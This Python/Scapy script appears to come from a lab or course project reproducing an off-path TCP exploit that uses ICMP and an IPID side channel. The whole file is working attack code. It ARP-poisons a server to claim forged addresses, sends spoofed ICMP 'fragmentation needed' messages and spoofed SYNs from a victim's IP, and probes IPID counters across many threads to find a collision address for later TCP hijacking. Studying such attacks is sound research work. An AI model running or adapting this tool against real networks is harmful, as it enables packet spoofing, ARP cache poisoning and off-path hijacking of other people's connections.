# coding=utf-8

import struct
import threading
from scapy.all import *
from scapy.layers.inet import *

"""
    @CreateDate:    2020/1/22
    @Group:         Off-Path TCP Exploit Via ICMP
                    and IPID Side-Channel
    @Project:       Work2
    @Filename:      parallel_check.py
    @Brief:         This program is used for finding a collision IP address. This 
                    means target ip address will share its IPID counter with victim 
                    when they interact with Mallory.
                    This program is different form single_check while this program 
                    utilizes multi-thread to check the potential address concurrently.
    @Modify:        
"""

forge_ip_prefix = '100.100.'                # used for construct a address pool
victim_ip = '100.100.128.2'                 # victim ip address
server_ip = '100.100.128.3'                 # server ip address
server_mac_addr = '00:0c:29:ac:09:a4'       # mac address of server used for ARP poison
my_mac_addr = get_if_hwaddr('ens33')        # mac address of Mallory
z_payload = b''                             # full-zero byte string used for padding
NUM_T = 20                                  # number of checking thread

# Critical Resource
semaphore = threading.Semaphore(1)          # write-lock semaphore
num1 = 2                                    # '100.100.' + num1
num2 = 3                                    # '100.100.num1.' + num2
found = False                               # collision address has been found?
result = 'no result'                        # collision result


"""
    @Date:      2020/1/19
    @Author:    Kevin.F
    @Param:     forged_ip -> The forged ip address which we are checking collision now.
    @Return:    None
    @Brief:     In real world practice, we need a big address pool for this attack.
                But for simplifying the experiment, we pretend to have a big pool
                in such a subnet.
                We utilized arp-poison attack to fool the server that we own such a
                IP address in the pool. 
"""
def arp_inject(forged_ip):
    symbol = False
    while symbol == False:
        # here we send a UDP packet to allure server to execute ip/mac convert
        send(IP(src=forged_ip, dst=server_ip) /
             UDP(dport=1371),
             iface='ens33', verbose=False)

        # then we sniff the ARP request message, and then send the poisonous ARP reply
        pkt = sniff(iface='ens33', filter="arp and (dst host " + forged_ip + ")", count=1, timeout=2)

        if len(pkt) == 1 and pkt[0][1].fields['psrc'] == server_ip and pkt[0][1].fields['pdst'] == forged_ip:
            symbol = True
            send(ARP(pdst=server_ip, hwdst=server_mac_addr, psrc=forged_ip, hwsrc=my_mac_addr, op=2),
                 iface='ens33', verbose=False)


"""
    @Date:      2020/1/19
    @Author:    Kevin.F
    @Param:     forged_ip ->  The forged ip address which we are checking collision now.
    @Return:    True ->       The param forged_ip maybe a collision address.
                False ->      The param forged_ip must not be a collision.
    @Brief:     This function is used for checking whether forged_ip is a collision.
                This function follow the step in slide (page 10,11).
                This function CAN NOT make sure an address is a collision with 100% sure,
                because the increment rule of the counters.
"""
def check_collision(forged_ip):
    negative = 0
    # repeat the test N times to counter uncertainty
    for i in range(0, 4):
        # Note. we must use one sr() to send all three packets to reduce
        # the delay, and try to make sure the counter add only 1
        # Note. there must be a service on dst port. Because we want server
        # to reply a SYN-ACK rather than a RST
        ans, uans = sr([
            IP(src=forged_ip, dst=server_ip) / ICMP(),
            IP(src=victim_ip, dst=server_ip) / TCP(sport=RandShort(), dport=22, flags='S'),
            IP(src=forged_ip, dst=server_ip) / ICMP()
        ], iface='ens33', verbose=False)

        ipid1 = ans.res[0][1].fields['id']
        ipid2 = ans.res[-1][1].fields['id']

        if (ipid2 - ipid1) >= 2:
            negative += 1

    if negative == 4:
        return True
    else:
        return False

"""
    @Date:      2020/1/19
    @Author:    Kevin.F
    @Param:     forged_ip ->  The forged ip address which we are checking collision now.
    @Return:    True ->       The param forged_ip maybe a collision address.
                False ->      The param forged_ip must not be a collision.
    @Brief:     Thread template used for fetch a new address for the pool and check it.
"""
def check_new():
    global found
    global num1
    global num2
    global result

    # if the result has been found or run out of addresses
    if found == True or num1 == 128:
        print(result)
        return

    # entry of critical zone
    semaphore.acquire()
    forge_ip = forge_ip_prefix + str(num1) + '.' + str(num2)
    num2 += 1
    if num2 == 254:
        num2 = 2
        num1 += 1
        print('Now num1=' + str(num1))
    semaphore.release()
    # print('Now we are checking ' + forge_ip)

    # before checking, we need to execute an ARP poison attack for forged ip address
    arp_inject(forge_ip)

    # Send fragment needed ICMP, force TCP set DF as 0
    send(IP(src=forge_ip, dst=server_ip) /
         ICMP(type=3, code=4, nexthopmtu=68) /
         IP(flags=2, src=server_ip, dst=victim_ip) /
         ICMP(type=0, code=0) /
         z_payload,
         iface='ens33', verbose=False)

    if check_collision(forge_ip):
        # when an address is suspected of collision, we check it again and again
        if check_collision(forge_ip) and check_collision(forge_ip):
            semaphore.acquire()
            result = forge_ip
            found = True
            semaphore.release()
            print('Collision Found! ' + result)
    else:
        # print(forge_ip + ' no Collision.')
        pass

    # invoke another thread agin
    t = threading.Thread(target=check_new)
    t.start()


if __name__ == '__main__':
    # construct padding payload
    for i in range(0, 520):
        z_payload += struct.pack('B', 0)

    # create sub-threads
    for i in range(0, NUM_T):
        t = threading.Thread(target=check_new, name=('T' + str(i)))
        t.start()
        print('Num_' + str(i) + ' thread started.')
